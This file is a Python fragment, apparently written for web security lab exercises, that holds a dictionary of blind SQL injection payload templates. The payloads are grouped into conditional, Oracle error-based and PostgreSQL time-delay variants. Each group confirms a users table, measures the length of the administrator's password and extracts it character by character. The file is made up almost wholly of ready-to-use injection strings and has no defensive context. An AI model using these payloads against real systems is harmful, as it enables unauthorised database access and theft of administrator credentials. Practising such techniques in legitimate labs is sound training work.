POISON_STASH = dict(

    conditional = dict(
        boolean_condition="' AND '1'='1'--",
        # user_table_confirm="' AND(SELECT 'x' FROM users LIMIT 1)='x'--",
        # confirm_admin_user="' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--",
        admin_password_limit="' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password){}{})='x'--",
        password_harvester="' AND (SELECT 'x' FROM users WHERE username='administrator' and ASCII(SUBSTRING(password,{},1)){}{})='x'--",
    ),

    # the lab uses an oracle database server
    error_induction= dict(
        boolean_condition="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        # user_table_confirm="'||(SELECT '' FROM users ROWNUM=1)||'",
        # confirm_admin_user="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",s
        admin_password_limit="'||(SELECT CASE WHEN LENGTH(password){}{} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
        password_harvester="'||(SELECT CASE WHEN ASCII(SUBSTR(password, {},1)){}{} THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'",
    ),

    time_delay = dict(
        boolean_condition="' ||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--",
        # user_table_confirm="' AND(SELECT 'x' FROM users LIMIT 1)='x'--",
        # confirm_admin_user="' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--",
        admin_password_limit="'||(SELECT CASE WHEN LENGTH(password){}{} THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--",
        password_harvester="'||(SELECT CASE WHEN ASCII(SUBSTR(password, {},1)){}{} THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator')--",
    )
)